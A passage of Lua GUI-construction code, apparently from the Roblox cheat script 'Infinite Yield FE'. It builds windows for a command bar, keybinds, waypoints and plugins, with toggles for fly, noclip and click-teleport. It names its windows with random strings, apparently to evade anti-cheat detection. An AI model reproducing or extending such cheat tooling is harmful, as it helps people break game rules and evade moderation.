local Dark_3 = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local Text_2 = Instance.new("TextLabel")
local CloseButton = Instance.new("ImageButton")
local IntroBackground = Instance.new("Frame")
local Logo = Instance.new("ImageLabel")
local Credits = Instance.new("TextBox")
local KeybindsFrame = Instance.new("Frame")
local Close = Instance.new("TextButton")
local Add = Instance.new("TextButton")
local Delete = Instance.new("TextButton")
local Holder_2 = Instance.new("ScrollingFrame")
local Example_2 = Instance.new("Frame")
local Text_3 = Instance.new("TextLabel")
local Delete_2 = Instance.new("TextButton")
local KeybindEditor = Instance.new("Frame")
local background_2 = Instance.new("Frame")
local Dark_4 = Instance.new("Frame")
local Directions = Instance.new("TextLabel")
local BindTo = Instance.new("TextButton")
local Add_2 = Instance.new("TextButton")
local Cmdbar_2 = Instance.new("TextBox")
local Toggles = Instance.new("ScrollingFrame")
local Fly = Instance.new("TextLabel")
local Select_3 = Instance.new("TextButton")
local Noclip = Instance.new("TextLabel")
local Select_4 = Instance.new("TextButton")
local Float = Instance.new("TextLabel")
local Select_5 = Instance.new("TextButton")
local ClickTP = Instance.new("TextLabel")
local Select_6 = Instance.new("TextButton")
local Dark_7 = Instance.new("Frame")
local shadow_2 = Instance.new("Frame")
local PopupText_2 = Instance.new("TextLabel")
local Exit_2 = Instance.new("ImageButton")
local PositionsFrame = Instance.new("Frame")
local Close_3 = Instance.new("TextButton")
local Delete_5 = Instance.new("TextButton")
local Holder_4 = Instance.new("ScrollingFrame")
local Example_4 = Instance.new("Frame")
local Text_5 = Instance.new("TextLabel")
local Delete_6 = Instance.new("TextButton")
local TP = Instance.new("TextButton")
local AliasesFrame = Instance.new("Frame")
local Close_2 = Instance.new("TextButton")
local Delete_3 = Instance.new("TextButton")
local Holder_3 = Instance.new("ScrollingFrame")
local Example_3 = Instance.new("Frame")
local Text_4 = Instance.new("TextLabel")
local Delete_4 = Instance.new("TextButton")
local Aliases = Instance.new("TextLabel")
local Select_7 = Instance.new("TextButton")
local PluginsFrame = Instance.new("Frame")
local Close_4 = Instance.new("TextButton")
local Add_3 = Instance.new("TextButton")
local Holder_5 = Instance.new("ScrollingFrame")
local Example_5 = Instance.new("Frame")
local Text_6 = Instance.new("TextLabel")
local Delete_7 = Instance.new("TextButton")
local PluginEditor = Instance.new("Frame")
local background_3 = Instance.new("Frame")
local Dark_8 = Instance.new("Frame")
local Dark_9 = Instance.new("Frame")
local Img = Instance.new("ImageButton")
local AddPlugin = Instance.new("TextButton")
local FileName = Instance.new("TextBox")
local About = Instance.new("TextLabel")
local Directions_2 = Instance.new("TextLabel")
local shadow_3 = Instance.new("Frame")
local PopupText_3 = Instance.new("TextLabel")
local Exit_3 = Instance.new("ImageButton")
local logsDrag = Instance.new("Frame")
local shadow = Instance.new("Frame")
local Hide = Instance.new("ImageButton")
local PopupText = Instance.new("TextLabel")
local Exit = Instance.new("ImageButton")
local scroll = Instance.new("ScrollingFrame")
local background = Instance.new("Frame")
local Dark_6 = Instance.new("Frame")
local Clear = Instance.new("TextButton")
local Toggle = Instance.new("TextButton")

local PARENT
if game:GetService("CoreGui"):FindFirstChild('RobloxGui') then
	PARENT = game:GetService("CoreGui").RobloxGui
else
	PARENT = game:GetService("CoreGui")
end

function randomString()
	local length = math.random(10,20)
	local array = {}
	for i = 1, length do
		array[i] = string.char(math.random(32, 126))
	end
	return table.concat(array)
end

Holder.Name = randomString()
Holder.Parent = PARENT
Holder.Active = true
Holder.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Holder.BackgroundTransparency = 0.20000000298023
Holder.BorderSizePixel = 0
Holder.Position = UDim2.new(1, -250, 1, -220)
Holder.Size = UDim2.new(0, 250, 0, 220)

Title.Name = "Title"
Title.Parent = Holder
Title.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Title.BackgroundTransparency = 1
Title.BorderSizePixel = 0
Title.Size = UDim2.new(0, 250, 0, 20)
Title.Font = Enum.Font.SourceSans
Title.TextSize = 20
Title.Text = "Infinite Yield FE"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextStrokeTransparency = 0

Dark.Name = "Dark"
Dark.Parent = Holder
Dark.Active = true
Dark.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Dark.BorderSizePixel = 0
Dark.Position = UDim2.new(0, 0, 0, 45)
Dark.Size = UDim2.new(0, 250, 0, 175)

Cmdbar.Name = "Cmdbar"
Cmdbar.Parent = Holder
Cmdbar.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Cmdbar.BackgroundTransparency = 1
Cmdbar.BorderSizePixel = 0
Cmdbar.Position = UDim2.new(0, 0, 0, 25)
Cmdbar.Size = UDim2.new(0, 250, 0, 20)
Cmdbar.Font = Enum.Font.SourceSans
Cmdbar.FontSize = Enum.FontSize.Size18
Cmdbar.Text = "Command Bar"
Cmdbar.TextColor3 = Color3.new(1, 1, 1)
Cmdbar.TextScaled = true
Cmdbar.TextWrapped = true
Cmdbar.TextStrokeTransparency = 0

Dark_2.Name = "Dark"
Dark_2.Parent = Holder
Dark_2.Active = true
Dark_2.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Dark_2.BorderSizePixel = 0
Dark_2.Position = UDim2.new(0, 0, 0, 20)
Dark_2.Size = UDim2.new(0, 250, 0, 5)

CMDsF.Name = "CMDs"
CMDsF.Parent = Holder
CMDsF.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
CMDsF.BackgroundTransparency = 1
CMDsF.BorderSizePixel = 0
CMDsF.Position = UDim2.new(0, 0, 0, 50)
CMDsF.Size = UDim2.new(0, 250, 0, 170)
CMDsF.BottomImage = "rbxasset://textures/blackBkg_square.png"
CMDsF.CanvasSize = UDim2.new(0, 0, 0, 0)
CMDsF.MidImage = "rbxasset://textures/blackBkg_square.png"
CMDsF.ScrollBarThickness = 8
CMDsF.TopImage = "rbxasset://textures/blackBkg_square.png"

SettingsButton.Name = "SettingsButton"
SettingsButton.Parent = Holder
SettingsButton.BackgroundColor3 = Color3.new(1, 1, 1)
SettingsButton.BackgroundTransparency = 1
SettingsButton.Position = UDim2.new(0, 230, 0, 25)
SettingsButton.Size = UDim2.new(0, 20, 0, 20)
SettingsButton.Image = "rbxassetid://1204397029"

Settings.Name = "Settings"
Settings.Parent = Holder
Settings.Active = true
Settings.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0, 0, 0, 220)
Settings.Size = UDim2.new(0, 250, 0, 175)

Prefix.Name = "Prefix"
Prefix.Parent = Settings
Prefix.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Prefix.BackgroundTransparency = 0.5
Prefix.BorderSizePixel = 0
Prefix.Position = UDim2.new(0, 0, 0, 5)
Prefix.Size = UDim2.new(0, 250, 0, 20)
Prefix.Font = Enum.Font.SourceSans
Prefix.FontSize = Enum.FontSize.Size14
Prefix.Text = "    Prefix"
Prefix.TextColor3 = Color3.new(1, 1, 1)
Prefix.TextXAlignment = Enum.TextXAlignment.Left

PrefixBox.Name = "PrefixBox"
PrefixBox.Parent = Prefix
PrefixBox.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
PrefixBox.BorderSizePixel = 0
PrefixBox.Position = UDim2.new(0, 230, 0, 0)
PrefixBox.Size = UDim2.new(0, 20, 0, 20)
PrefixBox.Font = Enum.Font.SourceSansBold
PrefixBox.FontSize = Enum.FontSize.Size14
PrefixBox.Text = ''
PrefixBox.TextColor3 = Color3.new(0, 0, 0)

Keybinds.Name = "Keybinds"
Keybinds.Parent = Settings
Keybinds.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Keybinds.BackgroundTransparency = 0.5
Keybinds.BorderSizePixel = 0
Keybinds.Position = UDim2.new(0, 0, 0, 55)
Keybinds.Size = UDim2.new(0, 250, 0, 20)
Keybinds.Font = Enum.Font.SourceSans
Keybinds.FontSize = Enum.FontSize.Size14
Keybinds.Text = "    Keybinds"
Keybinds.TextColor3 = Color3.new(1, 1, 1)
Keybinds.TextXAlignment = Enum.TextXAlignment.Left

Select.Name = "Select"
Select.Parent = Keybinds
Select.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select.BorderSizePixel = 0
Select.Position = UDim2.new(0, 200, 0, 0)
Select.Size = UDim2.new(0, 50, 0, 20)
Select.Font = Enum.Font.SourceSans
Select.FontSize = Enum.FontSize.Size14
Select.Text = "Edit"
Select.TextColor3 = Color3.new(0, 0, 0)

Aliases.Name = "Aliases"
Aliases.Parent = Settings
Aliases.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Aliases.BackgroundTransparency = 0.5
Aliases.BorderSizePixel = 0
Aliases.Position = UDim2.new(0, 0, 0, 80)
Aliases.Size = UDim2.new(0, 250, 0, 20)
Aliases.Font = Enum.Font.SourceSans
Aliases.FontSize = Enum.FontSize.Size14
Aliases.Text = "    Aliases"
Aliases.TextColor3 = Color3.new(1, 1, 1)
Aliases.TextXAlignment = Enum.TextXAlignment.Left

Select_7.Name = "Select"
Select_7.Parent = Aliases
Select_7.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_7.BorderSizePixel = 0
Select_7.Position = UDim2.new(0, 200, 0, 0)
Select_7.Size = UDim2.new(0, 50, 0, 20)
Select_7.Font = Enum.Font.SourceSans
Select_7.FontSize = Enum.FontSize.Size14
Select_7.Text = "Edit"
Select_7.TextColor3 = Color3.new(0, 0, 0)

StayOpen.Name = "StayOpen"
StayOpen.Parent = Settings
StayOpen.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
StayOpen.BackgroundTransparency = 0.5
StayOpen.BorderSizePixel = 0
StayOpen.Position = UDim2.new(0, 0, 0, 30)
StayOpen.Size = UDim2.new(0, 250, 0, 20)
StayOpen.Font = Enum.Font.SourceSans
StayOpen.FontSize = Enum.FontSize.Size14
StayOpen.Text = "    Keep Menu Open"
StayOpen.TextColor3 = Color3.new(1, 1, 1)
StayOpen.TextXAlignment = Enum.TextXAlignment.Left

Button.Name = "Button"
Button.Parent = StayOpen
Button.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Button.BorderSizePixel = 0
Button.Position = UDim2.new(0, 230, 0, 0)
Button.Size = UDim2.new(0, 20, 0, 20)

On.Name = "On"
On.Parent = Button
On.BackgroundColor3 = Color3.new(0.8, 0.8, 0.8)
On.BackgroundTransparency = 1
On.BorderSizePixel = 0
On.Position = UDim2.new(0, 2, 0, 2)
On.Size = UDim2.new(0, 16, 0, 16)
On.Font = Enum.Font.SourceSans
On.FontSize = Enum.FontSize.Size14
On.Text = ""
On.TextColor3 = Color3.new(0, 0, 0)

Positions.Name = "Positions"
Positions.Parent = Settings
Positions.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Positions.BackgroundTransparency = 0.5
Positions.BorderSizePixel = 0
Positions.Position = UDim2.new(0, 0, 0, 105)
Positions.Size = UDim2.new(0, 250, 0, 20)
Positions.Font = Enum.Font.SourceSans
Positions.FontSize = Enum.FontSize.Size14
Positions.Text = "    Waypoints / Positions"
Positions.TextColor3 = Color3.new(1, 1, 1)
Positions.TextXAlignment = Enum.TextXAlignment.Left

Select_8.Name = "Select"
Select_8.Parent = Positions
Select_8.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_8.BorderSizePixel = 0
Select_8.Position = UDim2.new(0, 200, 0, 0)
Select_8.Size = UDim2.new(0, 50, 0, 20)
Select_8.Font = Enum.Font.SourceSans
Select_8.FontSize = Enum.FontSize.Size14
Select_8.Text = "Edit / TP"
Select_8.TextColor3 = Color3.new(0, 0, 0)

Color.Name = "Color"
Color.Parent = Settings
Color.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Color.BackgroundTransparency = 0.5
Color.BorderSizePixel = 0
Color.Position = UDim2.new(0, 0, 0, 155)
Color.Size = UDim2.new(0, 250, 0, 20)
Color.Font = Enum.Font.SourceSans
Color.FontSize = Enum.FontSize.Size14
Color.Text = "    UI Color"
Color.TextColor3 = Color3.new(1, 1, 1)
Color.TextXAlignment = Enum.TextXAlignment.Left

Select_2.Name = "Select"
Select_2.Parent = Color
Select_2.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_2.BorderSizePixel = 0
Select_2.Position = UDim2.new(0, 200, 0, 0)
Select_2.Size = UDim2.new(0, 50, 0, 20)
Select_2.Font = Enum.Font.SourceSans
Select_2.FontSize = Enum.FontSize.Size14
Select_2.Text = "Change"
Select_2.TextColor3 = Color3.new(0, 0, 0)

Plugins.Name = "Plugins"
Plugins.Parent = Settings
Plugins.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Plugins.BackgroundTransparency = 0.5
Plugins.BorderSizePixel = 0
Plugins.Position = UDim2.new(0, 0, 0, 130)
Plugins.Size = UDim2.new(0, 250, 0, 20)
Plugins.Font = Enum.Font.SourceSans
Plugins.FontSize = Enum.FontSize.Size14
Plugins.Text = "    Plugins"
Plugins.TextColor3 = Color3.new(1, 1, 1)
Plugins.TextXAlignment = Enum.TextXAlignment.Left

Select_9.Name = "Select"
Select_9.Parent = Plugins
Select_9.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_9.BorderSizePixel = 0
Select_9.Position = UDim2.new(0, 200, 0, 0)
Select_9.Size = UDim2.new(0, 50, 0, 20)
Select_9.Font = Enum.Font.SourceSans
Select_9.FontSize = Enum.FontSize.Size14
Select_9.Text = "Edit"
Select_9.TextColor3 = Color3.new(0, 0, 0)

Example.Name = "Example"
Example.Parent = Holder
Example.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Example.BackgroundTransparency = 1
Example.BorderSizePixel = 0
Example.Size = UDim2.new(0, 190, 0, 20)
Example.Visible = false
Example.Font = Enum.Font.SourceSansBold
Example.FontSize = Enum.FontSize.Size18
Example.Text = "Example"
Example.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Example.TextStrokeTransparency = 0
Example.TextXAlignment = Enum.TextXAlignment.Left

Notification.Name = randomString()
Notification.Parent = PARENT
Notification.Active = true
Notification.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Notification.BackgroundTransparency = 0
Notification.BorderSizePixel = 0
Notification.Position = UDim2.new(1, -500, 1, 20)
Notification.Size = UDim2.new(0, 250, 0, 100)

Dark_3.Name = "Dark"
Dark_3.Parent = Notification
Dark_3.Active = true
Dark_3.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_3.BackgroundTransparency = 0.5
Dark_3.BorderSizePixel = 0
Dark_3.Position = UDim2.new(0, 0, 0, 20)
Dark_3.Size = UDim2.new(0, 250, 0, 5)

Title_2.Name = "Title"
Title_2.Parent = Notification
Title_2.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Title_2.BackgroundTransparency = 1
Title_2.BorderSizePixel = 0
Title_2.Size = UDim2.new(0, 250, 0, 20)
Title_2.Font = Enum.Font.SourceSans
Title_2.TextSize = 20
Title_2.Text = "Notification Title"
Title_2.TextColor3 = Color3.new(1, 1, 1)
Title_2.TextStrokeTransparency = 0

Text_2.Name = "Text"
Text_2.Parent = Notification
Text_2.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Text_2.BackgroundTransparency = 1
Text_2.BorderSizePixel = 0
Text_2.Position = UDim2.new(0, 5, 0, 25)
Text_2.Size = UDim2.new(0, 240, 0, 75)
Text_2.Font = Enum.Font.SourceSans
Text_2.FontSize = Enum.FontSize.Size18
Text_2.Text = "Notification Text"
Text_2.TextColor3 = Color3.new(1, 1, 1)
Text_2.TextWrapped = true

CloseButton.Name = "CloseButton"
CloseButton.Parent = Notification
CloseButton.BackgroundColor3 = Color3.new(1, 1, 1)
CloseButton.BackgroundTransparency = 1
CloseButton.Position = UDim2.new(0, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 20, 0, 20)
CloseButton.Image = "rbxassetid://2132544126"

IntroBackground.Name = "IntroBackground"
IntroBackground.Parent = Holder
IntroBackground.Active = true
IntroBackground.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
IntroBackground.BorderSizePixel = 0
IntroBackground.Position = UDim2.new(0, 0, 0, 45)
IntroBackground.Size = UDim2.new(0, 250, 0, 175)
IntroBackground.ZIndex = 4

Logo.Name = "Logo"
Logo.Parent = Holder
Logo.BackgroundColor3 = Color3.new(1, 1, 1)
Logo.BackgroundTransparency = 1
Logo.BorderSizePixel = 0
Logo.Position = UDim2.new(0, 125, 0, 127)
Logo.Size = UDim2.new(0, 10, 0, 10)
Logo.Image = "rbxassetid://1352543873"
Logo.ImageTransparency = 0
Logo.ZIndex = 5

Credits.Name = "Credits"
Credits.Parent = Holder
Credits.BackgroundColor3 = Color3.new(1, 1, 1)
Credits.BackgroundTransparency = 1
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0, 0, 0.9, 30)
Credits.Size = UDim2.new(0, 250, 0, 20)
Credits.Font = Enum.Font.SourceSansLight
Credits.FontSize = Enum.FontSize.Size18
Credits.Text = "Edge // Zwolf // Moon"
Credits.TextColor3 = Color3.new(1, 1, 1)
Credits.ZIndex = 5

KeybindsFrame.Name = "KeybindsFrame"
KeybindsFrame.Parent = Settings
KeybindsFrame.Active = true
KeybindsFrame.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
KeybindsFrame.BorderSizePixel = 0
KeybindsFrame.Position = UDim2.new(0, 0, 0, 175)
KeybindsFrame.Size = UDim2.new(0, 250, 0, 175)

Close.Name = "Close"
Close.Parent = KeybindsFrame
Close.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Close.BorderSizePixel = 0
Close.Position = UDim2.new(0, 205, 0, 150)
Close.Size = UDim2.new(0, 40, 0, 20)
Close.Font = Enum.Font.SourceSans
Close.FontSize = Enum.FontSize.Size14
Close.Text = "Close"
Close.TextColor3 = Color3.new(0, 0, 0)

Add.Name = "Add"
Add.Parent = KeybindsFrame
Add.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Add.BorderSizePixel = 0
Add.Position = UDim2.new(0, 5, 0, 150)
Add.Size = UDim2.new(0, 40, 0, 20)
Add.Font = Enum.Font.SourceSans
Add.FontSize = Enum.FontSize.Size14
Add.Text = "Add"
Add.TextColor3 = Color3.new(0, 0, 0)

Delete.Name = "Delete"
Delete.Parent = KeybindsFrame
Delete.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete.BorderSizePixel = 0
Delete.Position = UDim2.new(0, 50, 0, 150)
Delete.Size = UDim2.new(0, 40, 0, 20)
Delete.Font = Enum.Font.SourceSans
Delete.FontSize = Enum.FontSize.Size14
Delete.Text = "Clear"
Delete.TextColor3 = Color3.new(0, 0, 0)

Holder_2.Name = "Holder"
Holder_2.Parent = KeybindsFrame
Holder_2.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
Holder_2.BackgroundTransparency = 1
Holder_2.BorderSizePixel = 0
Holder_2.Position = UDim2.new(0, 0, 0, 0)
Holder_2.Size = UDim2.new(0, 250, 0, 145)
Holder_2.BottomImage = "rbxasset://textures/blackBkg_square.png"
Holder_2.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_2.MidImage = "rbxasset://textures/blackBkg_square.png"
Holder_2.ScrollBarThickness = 0
Holder_2.TopImage = "rbxasset://textures/blackBkg_square.png"

Example_2.Name = "Example"
Example_2.Parent = KeybindsFrame
Example_2.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Example_2.BackgroundTransparency = 0.5
Example_2.BorderSizePixel = 0
Example_2.Size = UDim2.new(0, 10, 0, 20)
Example_2.Visible = false

Text_3.Name = "Text"
Text_3.Parent = Example_2
Text_3.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Text_3.BackgroundTransparency = 0.5
Text_3.BorderSizePixel = 0
Text_3.Position = UDim2.new(0, 10, 0, 0)
Text_3.Size = UDim2.new(0, 240, 0, 20)
Text_3.Font = Enum.Font.SourceSans
Text_3.FontSize = Enum.FontSize.Size14
Text_3.Text = "nom"
Text_3.TextColor3 = Color3.new(1, 1, 1)
Text_3.TextXAlignment = Enum.TextXAlignment.Left

Delete_2.Name = "Delete"
Delete_2.Parent = Text_3
Delete_2.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_2.BorderSizePixel = 0
Delete_2.Position = UDim2.new(0, 200, 0, 0)
Delete_2.Size = UDim2.new(0, 40, 0, 20)
Delete_2.Font = Enum.Font.SourceSans
Delete_2.FontSize = Enum.FontSize.Size14
Delete_2.Text = "Delete"
Delete_2.TextColor3 = Color3.new(0, 0, 0)

KeybindEditor.Name = randomString()
KeybindEditor.Parent = PARENT
KeybindEditor.Active = true
KeybindEditor.BackgroundColor3 = Color3.new(1, 1, 1)
KeybindEditor.BackgroundTransparency = 1
KeybindEditor.Position = UDim2.new(0.5, -180, 0, -400)
KeybindEditor.Size = UDim2.new(0, 360, 0, 20)
KeybindEditor.ZIndex = 4

background_2.Name = "background"
background_2.Parent = KeybindEditor
background_2.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
background_2.BorderSizePixel = 0
background_2.Position = UDim2.new(0, 0, 0, 20)
background_2.Size = UDim2.new(0, 360, 0, 160)

Dark_4.Name = "Dark"
Dark_4.Parent = background_2
Dark_4.Active = true
Dark_4.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_4.BackgroundTransparency = 0.5
Dark_4.BorderSizePixel = 0
Dark_4.Position = UDim2.new(0, 135, 0, 5)
Dark_4.Size = UDim2.new(0, 5, 0, 155)

Directions.Name = "Directions"
Directions.Parent = background_2
Directions.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Directions.BackgroundTransparency = 1
Directions.BorderSizePixel = 0
Directions.Position = UDim2.new(0, 10, 0, 15)
Directions.Size = UDim2.new(0, 115, 0, 90)
Directions.Font = Enum.Font.SourceSansBold
Directions.FontSize = Enum.FontSize.Size14
Directions.Text = "Click the button below and press a key/mouse button. Then select what you want to bind it to."
Directions.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Directions.TextStrokeTransparency = 0
Directions.TextWrapped = true
Directions.TextYAlignment = Enum.TextYAlignment.Top

BindTo.Name = "BindTo"
BindTo.Parent = background_2
BindTo.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
BindTo.BackgroundTransparency = 0.5
BindTo.BorderSizePixel = 0
BindTo.Position = UDim2.new(0, 10, 0, 95)
BindTo.Size = UDim2.new(0, 115, 0, 50)
BindTo.Font = Enum.Font.SourceSans
BindTo.FontSize = Enum.FontSize.Size18
BindTo.Text = "Click to bind"
BindTo.TextColor3 = Color3.new(1, 1, 1)
BindTo.TextStrokeTransparency = 0

Add_2.Name = "Add"
Add_2.Parent = background_2
Add_2.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Add_2.BackgroundTransparency = 0.5
Add_2.BorderSizePixel = 0
Add_2.Position = UDim2.new(0, 310, 0, 20)
Add_2.Size = UDim2.new(0, 40, 0, 20)
Add_2.Font = Enum.Font.SourceSans
Add_2.FontSize = Enum.FontSize.Size18
Add_2.Text = "Add"
Add_2.TextColor3 = Color3.new(1, 1, 1)
Add_2.TextStrokeTransparency = 0

Cmdbar_2.Name = "Cmdbar"
Cmdbar_2.Parent = background_2
Cmdbar_2.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Cmdbar_2.BackgroundTransparency = 0.5
Cmdbar_2.BorderSizePixel = 0
Cmdbar_2.Position = UDim2.new(0, 150, 0, 20)
Cmdbar_2.Size = UDim2.new(0, 150, 0, 20)
Cmdbar_2.Font = Enum.Font.SourceSans
Cmdbar_2.FontSize = Enum.FontSize.Size18
Cmdbar_2.Text = "Command"
Cmdbar_2.TextColor3 = Color3.new(1, 1, 1)
Cmdbar_2.TextScaled = true
Cmdbar_2.TextStrokeTransparency = 0
Cmdbar_2.TextWrapped = true

Toggles.Name = "Toggles"
Toggles.Parent = background_2
Toggles.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Toggles.BackgroundTransparency = 1
Toggles.BorderSizePixel = 0
Toggles.Position = UDim2.new(0, 150, 0, 50)
Toggles.Size = UDim2.new(0, 200, 0, 100)
Toggles.BottomImage = "rbxasset://textures/blackBkg_square.png"
Toggles.CanvasSize = UDim2.new(0, 0, 0, 0)
Toggles.MidImage = "rbxasset://textures/blackBkg_square.png"
Toggles.ScrollBarThickness = 8
Toggles.TopImage = "rbxasset://textures/blackBkg_square.png"

Fly.Name = "Fly"
Fly.Parent = Toggles
Fly.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Fly.BackgroundTransparency = 0.5
Fly.BorderSizePixel = 0
Fly.Size = UDim2.new(0, 200, 0, 20)
Fly.Font = Enum.Font.SourceSans
Fly.FontSize = Enum.FontSize.Size14
Fly.Text = "    Toggle Fly"
Fly.TextColor3 = Color3.new(1, 1, 1)
Fly.TextXAlignment = Enum.TextXAlignment.Left

Select_3.Name = "Select"
Select_3.Parent = Fly
Select_3.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_3.BorderSizePixel = 0
Select_3.Position = UDim2.new(0, 160, 0, 0)
Select_3.Size = UDim2.new(0, 40, 0, 20)
Select_3.Font = Enum.Font.SourceSans
Select_3.FontSize = Enum.FontSize.Size14
Select_3.Text = "Add"
Select_3.TextColor3 = Color3.new(0, 0, 0)

Noclip.Name = "Noclip"
Noclip.Parent = Toggles
Noclip.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Noclip.BackgroundTransparency = 0.5
Noclip.BorderSizePixel = 0
Noclip.Position = UDim2.new(0, 0, 0, 25)
Noclip.Size = UDim2.new(0, 200, 0, 20)
Noclip.Font = Enum.Font.SourceSans
Noclip.FontSize = Enum.FontSize.Size14
Noclip.Text = "    Toggle Noclip"
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextXAlignment = Enum.TextXAlignment.Left

Select_4.Name = "Select"
Select_4.Parent = Noclip
Select_4.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_4.BorderSizePixel = 0
Select_4.Position = UDim2.new(0, 160, 0, 0)
Select_4.Size = UDim2.new(0, 40, 0, 20)
Select_4.Font = Enum.Font.SourceSans
Select_4.FontSize = Enum.FontSize.Size14
Select_4.Text = "Add"
Select_4.TextColor3 = Color3.new(0, 0, 0)

Float.Name = "Float"
Float.Parent = Toggles
Float.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Float.BackgroundTransparency = 0.5
Float.BorderSizePixel = 0
Float.Position = UDim2.new(0, 0, 0, 50)
Float.Size = UDim2.new(0, 200, 0, 20)
Float.Font = Enum.Font.SourceSans
Float.FontSize = Enum.FontSize.Size14
Float.Text = "    Toggle Float"
Float.TextColor3 = Color3.new(1, 1, 1)
Float.TextXAlignment = Enum.TextXAlignment.Left

Select_5.Name = "Select"
Select_5.Parent = Float
Select_5.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_5.BorderSizePixel = 0
Select_5.Position = UDim2.new(0, 160, 0, 0)
Select_5.Size = UDim2.new(0, 40, 0, 20)
Select_5.Font = Enum.Font.SourceSans
Select_5.FontSize = Enum.FontSize.Size14
Select_5.Text = "Add"
Select_5.TextColor3 = Color3.new(0, 0, 0)

ClickTP.Name = "Click TP"
ClickTP.Parent = Toggles
ClickTP.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
ClickTP.BackgroundTransparency = 0.5
ClickTP.BorderSizePixel = 0
ClickTP.Position = UDim2.new(0, 0, 0, 75)
ClickTP.Size = UDim2.new(0, 200, 0, 20)
ClickTP.Font = Enum.Font.SourceSans
ClickTP.FontSize = Enum.FontSize.Size14
ClickTP.Text = "    Click TP (Hold Key & Click)"
ClickTP.TextColor3 = Color3.new(1, 1, 1)
ClickTP.TextXAlignment = Enum.TextXAlignment.Left

Select_6.Name = "Select"
Select_6.Parent = ClickTP
Select_6.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_6.BorderSizePixel = 0
Select_6.Position = UDim2.new(0, 160, 0, 0)
Select_6.Size = UDim2.new(0, 40, 0, 20)
Select_6.Font = Enum.Font.SourceSans
Select_6.FontSize = Enum.FontSize.Size14
Select_6.Text = "Add"
Select_6.TextColor3 = Color3.new(0, 0, 0)

Dark_7.Name = "Dark"
Dark_7.Parent = background_2
Dark_7.Active = true
Dark_7.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_7.BackgroundTransparency = 0.5
Dark_7.BorderSizePixel = 0
Dark_7.Size = UDim2.new(0, 360, 0, 5)

shadow_2.Name = "shadow"
shadow_2.Parent = KeybindEditor
shadow_2.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
shadow_2.BorderColor3 = Color3.new(0, 0, 0)
shadow_2.BorderSizePixel = 0
shadow_2.Size = UDim2.new(0, 360, 0, 20)
shadow_2.ZIndex = 4

PopupText_2.Name = "PopupText"
PopupText_2.Parent = shadow_2
PopupText_2.BackgroundTransparency = 1
PopupText_2.Position = UDim2.new(0, 51, 0, 0)
PopupText_2.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
PopupText_2.ZIndex = 4
PopupText_2.Font = Enum.Font.SourceSans
PopupText_2.TextSize = 20
PopupText_2.Text = "Set Keybinds"
PopupText_2.TextColor3 = Color3.new(1, 1, 1)
PopupText_2.TextStrokeTransparency = 0
PopupText_2.TextWrapped = true

Exit_2.Name = "Exit"
